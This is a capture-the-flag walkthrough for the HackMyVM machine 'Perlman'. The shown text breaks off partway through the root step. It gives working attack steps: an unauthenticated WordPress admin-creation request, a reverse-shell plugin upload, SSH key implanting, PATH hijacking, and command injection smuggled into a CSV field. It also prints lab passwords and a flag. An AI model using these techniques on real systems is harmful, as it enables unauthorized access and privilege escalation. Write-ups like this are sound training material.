# Perlman

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.208:22
Open 10.0.2.208:25
Open 10.0.2.208:80
Open 10.0.2.208:110
Open 10.0.2.208:119
Open 10.0.2.208:995
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.208
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:f4:7d:ad:5d:2a:25:ec:17:b5:62:b0:2e:a5:8d:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2DYUfsVcKnbknL8l/3obgwbwPStIpVR69RgIvubPxz0GPaYH5n9yPnria4TVmKwzkUMCmxNlfG9/a6Fgzdom07H7eIhUAIXHOWjmq+bowp14aMEopOtizr3M7DpU5Ye46KeSy97Yu+x0bjn+6wcI+LPZudp8GSdel4324PZ4kLH5NXM4LIQygvJjQ5CIArZv2YiEDeTtDSIde90SZoIN+XcJ0+J+jzqIAJZmeT7Gqf62fj5ti/koi9sQzTjvCpDdWjAtiKEOkP1vonyM5MlGIL/V0+f78crS2JmSfeiKN3hTr7wRSwPBZvoDbVCiz92IgAHzxjpy5uzBTp6gY5V4wBIZhP5JGBnn3rJsvPH5T8Vr6pe4IfJ+z398b+ogyobbrJNv3aiD2u4RegviVE6r8mSBPLbKA1mIgy5qA8SHpJibKJp6+gdG0k0QcH4kBMdDNggIsuN8FxcX2CeT/qoGOeg+KXvUrA2LDFyuVcWN9t2T6z1eA+QsPjpodmNGbOpU=
|   256 f1:d8:01:07:9f:d7:8d:2e:da:a4:9f:36:a2:ff:2a:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPJwZhipbadeNNxszKG3A83dRK+orUlQ0hAZtAHH5XFrJYUYW3KTAsXHfb54rCCXQApecmcQGj/wsWX5Udced9k=
|   256 91:02:29:33:c5:ff:2d:d8:63:b8:47:f3:f3:d8:79:ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBssx4VcQhzif7T2mibWNJYqgXRDUbndkYiBGfm3XCt4
25/tcp  open  smtp     syn-ack Postfix smtpd
| ssl-cert: Subject: commonName=perlman
| Subject Alternative Name: DNS:perlman
| Issuer: commonName=perlman
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-02T10:12:39
| Not valid after:  2032-06-29T10:12:39
| MD5:   1ac5:1a22:67a7:a9bc:71fd:5f87:af54:5639
| SHA-1: c609:bc84:2ece:7080:8d0e:d169:d81c:f369:b50f:24ac
| -----BEGIN CERTIFICATE-----
| MIIC0zCCAbugAwIBAgIUYyfZ7xaEw82UQOeqR51M7iVeTFkwDQYJKoZIhvcNAQEL
| BQAwEjEQMA4GA1UEAwwHcGVybG1hbjAeFw0yMjA3MDIxMDEyMzlaFw0zMjA2Mjkx
| MDEyMzlaMBIxEDAOBgNVBAMMB3BlcmxtYW4wggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCZHxEKTHH6Z/ITuPkv5F2WPEYFpFPkXHsYjBXMTUBU4fnlCGKI
| EvYMwEJ0r7IkYxnS4ilg8nbmmZ/fJ71y5mAMPm0hp2KVxeiuxrt8FNdzhzXYuhnX
| izlgDDEPDY5BmUCTbyjTfiyMliMO/129VT0uatRXmiOA+HdVIMrQjdKeXrREK7jJ
| ELYOKMOmP5ChuGlHFup+Q2s9MbxghvX6kfXqYI7jDSWBghPZ1QUMXN5wg+Ke6qzC
| cD53CZWckw18kn9GUtU97Wnya7R1vnd0Mq+8YEs3nSSV0GXjHscNugHGHQdcgFWg
| tAGCSOxexcr1aS/NyuO5pKcWJc02+G4jo1hRAgMBAAGjITAfMAkGA1UdEwQCMAAw
| EgYDVR0RBAswCYIHcGVybG1hbjANBgkqhkiG9w0BAQsFAAOCAQEAihWPgk7Hbdmp
| kjybLZgjXyVnQsLWr/+KZOYnPiRfrPAIWkmdZFN6BvOTB0qq+bvaYYDZJ4NtVLcc
| sYZGwZKicE2yqr0ZI11RlBCWy5M+0/UfDf7f4JHl5FN27LTF4wGpgQitOV9B93OC
| MKqQYpf/NiNrC9j7GQZtAW30ID907jY0icdNz1/r+7vQOLQDJu8Xjmopi+BCNtzP
| /L21NQAZwST4l07L0Aj5SemlljRZvlqecd2QxhmyRu0Y6CPpamtWxxpRDN4LYHaa
| gZMY6SJ9Q79QNnF1L+CI1Ups9MpcjQoBZm2s5nJ24B7r1YczG6YtsTR6qgqnMnqr
| LU3nfj/LUw==
|_-----END CERTIFICATE-----
|_smtp-commands: perlman.hmv, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http     syn-ack Apache httpd 2.4.54 ((Debian))
| http-git: 
|   10.0.2.208:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: wp 
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Sync - Mobile App Landing Page HTML Template
|_http-favicon: Unknown favicon MD5: 1BD511222AD00F8970D00AFDCF215F9B
110/tcp open  pop3     syn-ack Dovecot pop3d
| ssl-cert: Subject: commonName=perlman
| Subject Alternative Name: DNS:perlman
| Issuer: commonName=perlman
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-02T10:12:39
| Not valid after:  2032-06-29T10:12:39
| MD5:   1ac5:1a22:67a7:a9bc:71fd:5f87:af54:5639
| SHA-1: c609:bc84:2ece:7080:8d0e:d169:d81c:f369:b50f:24ac
| -----BEGIN CERTIFICATE-----
| MIIC0zCCAbugAwIBAgIUYyfZ7xaEw82UQOeqR51M7iVeTFkwDQYJKoZIhvcNAQEL
| BQAwEjEQMA4GA1UEAwwHcGVybG1hbjAeFw0yMjA3MDIxMDEyMzlaFw0zMjA2Mjkx
| MDEyMzlaMBIxEDAOBgNVBAMMB3BlcmxtYW4wggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCZHxEKTHH6Z/ITuPkv5F2WPEYFpFPkXHsYjBXMTUBU4fnlCGKI
| EvYMwEJ0r7IkYxnS4ilg8nbmmZ/fJ71y5mAMPm0hp2KVxeiuxrt8FNdzhzXYuhnX
| izlgDDEPDY5BmUCTbyjTfiyMliMO/129VT0uatRXmiOA+HdVIMrQjdKeXrREK7jJ
| ELYOKMOmP5ChuGlHFup+Q2s9MbxghvX6kfXqYI7jDSWBghPZ1QUMXN5wg+Ke6qzC
| cD53CZWckw18kn9GUtU97Wnya7R1vnd0Mq+8YEs3nSSV0GXjHscNugHGHQdcgFWg
| tAGCSOxexcr1aS/NyuO5pKcWJc02+G4jo1hRAgMBAAGjITAfMAkGA1UdEwQCMAAw
| EgYDVR0RBAswCYIHcGVybG1hbjANBgkqhkiG9w0BAQsFAAOCAQEAihWPgk7Hbdmp
| kjybLZgjXyVnQsLWr/+KZOYnPiRfrPAIWkmdZFN6BvOTB0qq+bvaYYDZJ4NtVLcc
| sYZGwZKicE2yqr0ZI11RlBCWy5M+0/UfDf7f4JHl5FN27LTF4wGpgQitOV9B93OC
| MKqQYpf/NiNrC9j7GQZtAW30ID907jY0icdNz1/r+7vQOLQDJu8Xjmopi+BCNtzP
| /L21NQAZwST4l07L0Aj5SemlljRZvlqecd2QxhmyRu0Y6CPpamtWxxpRDN4LYHaa
| gZMY6SJ9Q79QNnF1L+CI1Ups9MpcjQoBZm2s5nJ24B7r1YczG6YtsTR6qgqnMnqr
| LU3nfj/LUw==
|_-----END CERTIFICATE-----
|_pop3-capabilities: PIPELINING USER UIDL RESP-CODES TOP CAPA AUTH-RESP-CODE SASL(PLAIN) STLS
|_ssl-date: TLS randomness does not represent time
119/tcp open  nntp     syn-ack InterNetNews (INN) 2.6.4
995/tcp open  ssl/pop3 syn-ack Dovecot pop3d
| ssl-cert: Subject: commonName=perlman
| Subject Alternative Name: DNS:perlman
| Issuer: commonName=perlman
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-02T10:12:39
| Not valid after:  2032-06-29T10:12:39
| MD5:   1ac5:1a22:67a7:a9bc:71fd:5f87:af54:5639
| SHA-1: c609:bc84:2ece:7080:8d0e:d169:d81c:f369:b50f:24ac
| -----BEGIN CERTIFICATE-----
| MIIC0zCCAbugAwIBAgIUYyfZ7xaEw82UQOeqR51M7iVeTFkwDQYJKoZIhvcNAQEL
| BQAwEjEQMA4GA1UEAwwHcGVybG1hbjAeFw0yMjA3MDIxMDEyMzlaFw0zMjA2Mjkx
| MDEyMzlaMBIxEDAOBgNVBAMMB3BlcmxtYW4wggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCZHxEKTHH6Z/ITuPkv5F2WPEYFpFPkXHsYjBXMTUBU4fnlCGKI
| EvYMwEJ0r7IkYxnS4ilg8nbmmZ/fJ71y5mAMPm0hp2KVxeiuxrt8FNdzhzXYuhnX
| izlgDDEPDY5BmUCTbyjTfiyMliMO/129VT0uatRXmiOA+HdVIMrQjdKeXrREK7jJ
| ELYOKMOmP5ChuGlHFup+Q2s9MbxghvX6kfXqYI7jDSWBghPZ1QUMXN5wg+Ke6qzC
| cD53CZWckw18kn9GUtU97Wnya7R1vnd0Mq+8YEs3nSSV0GXjHscNugHGHQdcgFWg
| tAGCSOxexcr1aS/NyuO5pKcWJc02+G4jo1hRAgMBAAGjITAfMAkGA1UdEwQCMAAw
| EgYDVR0RBAswCYIHcGVybG1hbjANBgkqhkiG9w0BAQsFAAOCAQEAihWPgk7Hbdmp
| kjybLZgjXyVnQsLWr/+KZOYnPiRfrPAIWkmdZFN6BvOTB0qq+bvaYYDZJ4NtVLcc
| sYZGwZKicE2yqr0ZI11RlBCWy5M+0/UfDf7f4JHl5FN27LTF4wGpgQitOV9B93OC
| MKqQYpf/NiNrC9j7GQZtAW30ID907jY0icdNz1/r+7vQOLQDJu8Xjmopi+BCNtzP
| /L21NQAZwST4l07L0Aj5SemlljRZvlqecd2QxhmyRu0Y6CPpamtWxxpRDN4LYHaa
| gZMY6SJ9Q79QNnF1L+CI1Ups9MpcjQoBZm2s5nJ24B7r1YczG6YtsTR6qgqnMnqr
| LU3nfj/LUw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING USER UIDL TOP CAPA RESP-CODES SASL(PLAIN) AUTH-RESP-CODE
Service Info: Hosts:  perlman.hmv, server.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/perlman/writeup.png)

Nmap found `.git` so dump it
```bash
└─$ git-dumper http://10.0.2.208/ dump
```

Domain found, add it
```bash
└─$ cat db/index.php
<?php
    error_reporting(0);
    $allow = ['perlman', 'perlman.htb'];
    if(!isset($_SERVER['HTTP_X_FORWARDED_FOR']) || !in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allow)) {
        die('Access allowed only for perlman.htb staff.');
    } else {
       header('location: old_backup_2009');
    }
?>
```

```bash
└─$ grep INSERT users.sql
INSERT INTO `users` VALUES (1,'webmaster','','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');
```

```bash
└─$ git log -p -- 'users*.sql' '*users*.sql' | grep INSERT
-INSERT INTO `users` VALUES (1,'webmaster','$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');
+INSERT INTO `users` VALUES (1,'webmaster','','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');
+INSERT INTO `users` VALUES (1,'webmaster','$P$BCaMhRZQp/mi0nyIVVPS6u1EU8sTCR/','webmaster','webmaster@perlman.hmv','http://perlman.hmv','2022-07-03 16:23:02','',0,'webmaster');
```

```bash
PS C:\Program Files\Hashcat> john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
cookie           (?)
```

## NNTP 119

- [https://ahmed-tarek.gitbook.io/security-notes/notes/attack-vectors-by-port/nntp-119](https://ahmed-tarek.gitbook.io/security-notes/notes/attack-vectors-by-port/nntp-119)

```bash
└─$ nc -nvC 10.0.2.208 119
200 server.example.net InterNetNews NNRP server INN 2.6.4 ready (posting ok)
LIST
215 Newsgroups in form "group high low status"
control 0000000000 0000000001 n
control.cancel 0000000000 0000000001 n
control.checkgroups 0000000000 0000000001 n
control.newgroup 0000000000 0000000001 n
control.rmgroup 0000000000 0000000001 n
junk 0000000000 0000000001 n
local.general 0000000000 0000000001 y
local.test 0000000000 0000000001 y
perlman.hmv 0000000002 0000000001 y
.
```

Read messages
```bash
└─$ nc -nvC 10.0.2.208 119
(UNKNOWN) [10.0.2.208] 119 (nntp) open
200 server.example.net InterNetNews NNRP server INN 2.6.4 ready (posting ok)
> GROUP perlman.hmv
211 1 1 2 perlman.hmv
> ARTICLE 1
423 No such article number 1
> ARTICLE 2
220 2 <tfi784$403$1@perlman.hmv> article
Path: server.example.net!.POSTED.192.168.0.27!not-for-mail
From: rita <rita@perlman.hmv>
Newsgroups: perlman.hmv
Subject: Whats up ?!
Date: Sat, 10 Sep 2022 14:33:40 -0000 (UTC)
Organization: A poorly-installed InterNetNews site
Message-ID: <tfi784$403$1@perlman.hmv>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Injection-Date: Sat, 10 Sep 2022 14:33:40 -0000 (UTC)
Injection-Info: perlman.hmv; posting-host="192.168.0.27"; logging-data="4099"; mail-complaints-to="usenet@perlman.hmv"
User-Agent: Pan/0.151 (Butcha; a6f6327)
Xref: server.example.net perlman.hmv:2

So cool to have installed a newsgroup server!
See you soon kissss
.
> ARTICLE 3
423 No such article number 3
```

::: info Note
User input prefixed with `>` (not required in Netcat)
:::

## POP3 

No emails
```bash
└─$ nc -nv 10.0.2.208 110
(UNKNOWN) [10.0.2.208] 110 (pop3) open
+OK Dovecot (Debian) ready.
USER rita
+OK
PASS cookie
+OK Logged in.
STAT
+OK 0 0
LIST
+OK 0 messages:
.
RETR 1
-ERR There's no message 1.
QUIT
+OK Logging out.
```

We can try sending email to someone and maybe `catchall` will respond?
```bash
└─$ swaks --to let@me.in --from rita@perlman.hmv --server 10.0.2.208 --port 25 --body "test"
=== Trying 10.0.2.208:25...
=== Connected to 10.0.2.208.
<-  220 perlman.hmv ESMTP Postfix (Debian/GNU)
 -> EHLO kraken
<-  250-perlman.hmv
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<rita@perlman.hmv>
<-  250 2.1.0 Ok
 -> RCPT TO:<let@me.in>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sat, 14 Feb 2026 11:02:11 -0500
 -> To: let@me.in
 -> From: rita@perlman.hmv
 -> Subject: test Sat, 14 Feb 2026 11:02:11 -0500
 -> Message-Id: <20260214110211.1671665@kraken>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 ->
 -> test
 ->
 ->
 -> .
<-  250 2.0.0 Ok: queued as 6BA0041623
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

Success
```bash
└─$ echo $'USER rita\nPASS cookie\nSTAT\nLIST\nQUIT' | nc -nv 10.0.2.208 110
(UNKNOWN) [10.0.2.208] 110 (pop3) open
+OK Dovecot (Debian) ready.
+OK
+OK Logged in.
+OK 1 2786
+OK 1 messages:
1 507
.
+OK Logging out.
```

```bash
└─$ echo $'USER rita\nPASS cookie\nSTAT\nLIST\nRETR 1\nQUIT' | nc -nv 10.0.2.208 110
(UNKNOWN) [10.0.2.208] 110 (pop3) open
+OK Dovecot (Debian) ready.
+OK
+OK Logged in.
+OK 2 3293
+OK 2 messages:
1 2786
.
+OK 2786 octets
Return-Path: <>
X-Original-To: rita@perlman.hmv
Delivered-To: rita@perlman.hmv
Received: by perlman.hmv (Postfix)
	id B685D4162B; Sat, 14 Feb 2026 17:02:05 +0100 (CET)
Date: Sat, 14 Feb 2026 17:02:05 +0100 (CET)
From: MAILER-DAEMON@perlman.hmv (Mail Delivery System)
Subject: Undelivered Mail Returned to Sender
To: rita@perlman.hmv
Auto-Submitted: auto-replied
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status;
	boundary="6BA0041623.1771084925/perlman.hmv"
Content-Transfer-Encoding: 8bit
Message-Id: <20260214160205.B685D4162B@perlman.hmv>

This is a MIME-encapsulated message.

--6BA0041623.1771084925/perlman.hmv
Content-Description: Notification
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

           Charset: us-ascii
           From: MAILER-DAEMON (mailer@itzhak.perlman.hmv)
           Subject: Undelivered Mail Returned to Sender
           Postmaster-Subject: Postmaster Copy: Undelivered Mail
	
	
           This is the mail system at host perlman.hmv.

           I'm sorry to have to inform you that your message could not
           be delivered to one or more recipients. It's attached below.

           For further assistance, please send mail to postmaster.

           If you do so, please include this problem report. You can
           delete your own text from the attached returned message.

                              The mail system
           EOF

<let@me.in>: Host or domain name not found. Name service error for name=me.in
    type=AAAA: Host found but no data record of requested type

--6BA0041623.1771084925/perlman.hmv
Content-Description: Delivery report
Content-Type: message/delivery-status

Reporting-MTA: dns; perlman.hmv
X-Postfix-Queue-ID: 6BA0041623
X-Postfix-Sender: rfc822; rita@perlman.hmv
Arrival-Date: Sat, 14 Feb 2026 17:02:05 +0100 (CET)

Final-Recipient: rfc822; let@me.in
Original-Recipient: rfc822;let@me.in
Action: failed
Status: 5.4.4
Diagnostic-Code: X-Postfix; Host or domain name not found. Name service error
    for name=me.in type=AAAA: Host found but no data record of requested type

--6BA0041623.1771084925/perlman.hmv
+OK Logging out.
```

## Wordpress

New domain found

![writeup-1.png](/assets/pentest/hackmyvm/perlman/writeup-1.png)

```bash
└─$ nuclei -u http://itzhak.perlman.hmv/ -tags wordpress
[CVE-2022-3590] [http] [medium] http://itzhak.perlman.hmv/xmlrpc.php
[CVE-2023-5561] [http] [medium] http://itzhak.perlman.hmv/?rest_route=/wp/v2/users&search=@ [route="?rest_route=/wp/v2/users&"]
[wordpress-akismet:outdated_version] [http] [info] http://itzhak.perlman.hmv/wp-content/plugins/akismet/readme.txt ["5.0"] [last_version="5.5"]
[wordpress-xmlrpc-listmethods] [http] [info] http://itzhak.perlman.hmv/xmlrpc.php
[wordpress-directory-listing] [http] [info] http://itzhak.perlman.hmv/wp-content/uploads/
[wordpress-readme-file] [http] [info] http://itzhak.perlman.hmv/readme.html
[wordpress-directory-listing] [http] [info] http://itzhak.perlman.hmv/wp-includes/
[wp-user-enum:usernames] [http] [low] http://itzhak.perlman.hmv/?rest_route=/wp/v2/users/ ["webmaster"]
[wp-xmlrpc-pingback-detection] [http] [info] http://itzhak.perlman.hmv/xmlrpc.php
[wp-xmlrpc-pingback-detection] [http] [info] http://itzhak.perlman.hmv/xmlrpc.php
[wordpress-detect:version_by_css] [http] [info] http://itzhak.perlman.hmv/wp-admin/install.php ["6.0.2"]
[wordpress-passive-detection:plugin_slug] [http] [info] http://itzhak.perlman.hmv/ ["thecartpress"]
[wordpress-passive-detection:theme_slug] [http] [info] http://itzhak.perlman.hmv/ ["twentytwentyone"]
[wordpress-xmlrpc-detect] [http] [info] http://itzhak.perlman.hmv/xmlrpc.php
[wp-license-file] [http] [info] http://itzhak.perlman.hmv/license.txt
[wordpress-theme-detect:twentytwentyone] [http] [info] http://itzhak.perlman.hmv/
```

```bash
└─$ docker run -it --network host --rm wpscanteam/wpscan --url http://itzhak.perlman.hmv/ -e vp --api-token XXX
...
[i] Plugin(s) Identified:
[+] thecartpress
 | Location: http://itzhak.perlman.hmv/wp-content/plugins/thecartpress/
 | Latest Version: 1.5.3.6 (up to date)
 | Last Updated: 2017-01-12T19:25:00.000Z
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 | [!] Title: TheCartPress eCommerce Shopping Cart <= 1.5.3.6 - Unauthenticated Arbitrary Admin Account Creation
 |     References:
 |      - https://wpscan.com/vulnerability/9b403259-0c84-4566-becd-eb531c486c21
 |      - https://www.exploit-db.com/exploits/50378/
 |
 | Version: 1.5.3.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://itzhak.perlman.hmv/wp-content/plugins/thecartpress/readme.txt
```

```bash
└─$ curl 'http://itzhak.perlman.hmv/wp-admin/admin-ajax.php' \
    -d 'action=tcp_register_and_login_ajax' \
    -d 'tcp_new_user_name=letmein' \
    -d 'tcp_new_user_pass=letmein' \
    -d 'tcp_repeat_user_pass=letmein' \
    -d 'tcp_new_user_email=let@me.in' \
    -d 'tcp_role=administrator'
""
```

Can't use **Theme Editor** to inject backdoor

![writeup-2.png](/assets/pentest/hackmyvm/perlman/writeup-2.png)

```bash
└─$ reversePress http://itzhak.perlman.hmv/ -w -i shell.php
```

Upload and activate plugin
- [http://itzhak.perlman.hmv/wp-content/plugins/reverse_shell_plugin/shell.php](http://itzhak.perlman.hmv/wp-content/plugins/reverse_shell_plugin/shell.php)

![writeup-3.png](/assets/pentest/hackmyvm/perlman/writeup-3.png)

## Lateral Movement (rita)

```bash
www-data@perlman.hmv:…/www/itzhak# cat wp-config.php | grep define
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', '||LA0666||' );
define( 'DB_HOST', 'localhost' );
```

We can use previous password for local user
```bash
www-data@perlman.hmv:…/www/itzhak# timeout 1 echo cookie | su - rita -c id
Password: uid=1000(rita) gid=1000(rita) groups=1000(rita)
```

```bash
└─$ gen_ssh_deploy id_rsa rita
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/rita/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzLFZrIuhgyrbPmCDhkBKLyxlyRzrX7NozT0bqE2JQC woyag@kraken' >> /home/rita/.ssh/authorized_keys ; chmod 700 /home/rita/.ssh ; chmod 600 /home/rita/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa rita@perlman.hmv
rita@perlman:~$ id
uid=1000(rita) gid=1000(rita) groups=1000(rita)
```

## Privilege Escalation (milou)

Some unusual SUID binaries
```bash
rita@perlman:~$ find / -perm -4000 -ls 2>/dev/null
   393734     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
   394260     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount
   405964    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo
   393893     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su
   390247     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
   394262     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount
   390248     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
   407592     24 -rwsr-xr-x   1 root     root        23448 Jan 13  2022 /usr/bin/pkexec
   390245     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
   390244     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
   135091     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   264175    472 -rwsr-xr-x   1 root     root         481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign
   407980     16 -rwsr-xr--   1 root     news          14480 Feb 16  2021 /usr/lib/news/bin/innbind # <-
   407319     28 -rwsr-xr--   1 news     uucp          26896 Feb 16  2021 /usr/lib/news/bin/rnews   # <-
   407594     20 -rwsr-xr-x   1 root     root          19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
```

Hmmm
```bash
rita@perlman:~$ find /home -type f -ls 2>/dev/null | grep -v -e mail -e bash -e rita
   265871      4 -rwx------   1 ze_perlman ze_perlman       33 Sep 11  2022 /home/ze_perlman/user.txt
   266042      4 -rwxr-xr-x   1 ze_perlman ze_perlman      557 Sep 11  2022 /home/ze_perlman/inventory
   268118      4 -rw-r--r--   1 ze_perlman ze_perlman      807 Jul 26  2022 /home/ze_perlman/.profile
   266043      4 -rw-r--rw-   1 ze_perlman ze_perlman      115 Sep 11  2022 /home/ze_perlman/perl_store.csv
   265860      4 -rwxr-xr-x   1 milou      milou           152 Sep 11  2022 /home/milou/clean.sh
   268114      4 -rw-r--r--   1 milou      milou           883 Jul 27  2022 /home/milou/.profile
```

Looks like a cronjob
```bash
rita@perlman:~$ cat /home/milou/clean.sh
#!/bin/bash

ext=(save bak bif old bck bkz sqb bak2)
for x in ${ext[@]}; do
	cd /tmp && find . -type f -user $(whoami) -name "*.$x" -exec rm {} +
done
```

We could probably take over `find` binary or even `whoami`, leave this in `/tmp` and figure out if we can
```bash
rita@perlman:~$ echo "mkdir -p /home/milou/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzLFZrIuhgyrbPmCDhkBKLyxlyRzrX7NozT0bqE2JQC woyag@kraken' >> /home/milou/.ssh/authorized_keys ; chmod 700 /home/milou/.ssh ; chmod 600 /home/milou/.ssh/authorized_keys" > /tmp/find
rita@perlman:~$ chmod +x /tmp/find
```

`milou` user has `.` in the first chunk, meaning it's going to search binaries from PWD and then others, very good for making other user execute anything :D
```bash
rita@perlman:~$ cat .profile | grep PATH | tail -1
export PATH=.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

```bash
└─$ ssh -i id_rsa milou@perlman.hmv
milou@perlman:~$ id
uid=1001(milou) gid=1001(milou) groups=1001(milou)
```

## Privilege Escalation (ze_perlman)

```bash
milou@perlman:~$ sudo -l
Matching Defaults entries for milou on perlman:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User milou may run the following commands on perlman:
    (ze_perlman) NOPASSWD: /bin/bash /home/ze_perlman/inventory
```

```bash
#!/bin/bash

echo -e "\n+IT Inventory+\n"
green = $(tput setaf 2)
bold = $(tput bold)
normal = $(tput sgr0)

while IFS = , read item brand price numb
do
    subtotal = $((numb*price))
    echo -e "Item:\t\t ${bold}$item${normal}"
    echo -e "Brand:\t\t $brand"
    echo -e "Price/Unit:\t $price$"
    echo -e "Quantity:\t $numb pcs"
    echo -e "Subtotal:\t $subtotal$"
    echo ""

    for x in ${subtotal[@]} do; (( total+ = x )); done

    sum = 0
    for i in "${total[@]}"; do (( sum+ = i )); done

done < < (cat perl_store.csv | sed -n '1!p')

echo -e "\nTotal cost: \t ${bold}${green}$sum$"
```

Script is vulnerable to **Command substitution via arithmetic**
```
subtotal=$((numb*price))
```

Bash arithmetic `$((...))` evaluates array subscripts, which can execute code. If price or numb contains following bash will execute `whoami` during the arithmetic evaluation.
```
a[$(whoami)]
```

POC
```bash
milou@perlman:/home/ze_perlman$ echo 'item,brand,a[$(id > /tmp/pwned)],1' >> /home/ze_perlman/perl_store.csv
milou@perlman:/home/ze_perlman$ sudo -u ze_perlman /bin/bash /home/ze_perlman/inventory
milou@perlman:/home/ze_perlman$ cat /tmp/pwned
uid=1002(ze_perlman) gid=1002(ze_perlman) groups=1002(ze_perlman)
```

```bash
milou@perlman:/home/ze_perlman$ nano /tmp/auth # gen_ssh_deploy
milou@perlman:/home/ze_perlman$ chmod +x /tmp/auth
milou@perlman:/home/ze_perlman$ echo 'item,brand,a[$(/tmp/auth)],1' >> /home/ze_perlman/perl_store.csv
milou@perlman:/home/ze_perlman$ sudo -u ze_perlman /bin/bash /home/ze_perlman/inventory
---
└─$ ssh -i id_rsa ze_perlman@perlman.hmv
ze_perlman@perlman:~$ id
uid=1002(ze_perlman) gid=1002(ze_perlman) groups=1002(ze_perlman)
```

### User.txt

```bash
ze_perlman@perlman:~$ cat user.txt
7efd84255146266f3ca02579eb71a36f
```

## Privilege Escalation (root)

```bash
ze_perlman@perlman:~$ sudo -l
Matching Defaults entries for ze_perlman on perlman:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ze_perlman may run the following commands on perlman:
    (root) NOPASSWD: /bin/bash /opt/backup/bk *
```

```bash
ze_perlman@perlman:~$ file /opt/backup/bk
/opt/backup/bk: Bourne-Again shell script, ASCII text executable

ze_perlman@perlman:~$ cat /opt/backup/bk
#!/bin/bash

vfy = $( < /opt/vfy.txt)

backup() {
	cp /etc/{passwd,shadow,sudoers} /opt/backup
	cp ~/.ssh/id_rsa /opt/backup
	chmod 700 /opt/backup/*
	chmod 700 /root
	chown root:root /usr/lib/news/*
	chown root:root *
	chown -R news:news /var/lib/news
	chown -R www-data:www-data /var/www
}

[[ $1 = = "${vfy/un/}" ]] & & backup

ze_perlman@perlman:~$ cat /opt/vfy.txt
undesired-root-2022
```

We successfully moved files, but they're only readable by root
```bash
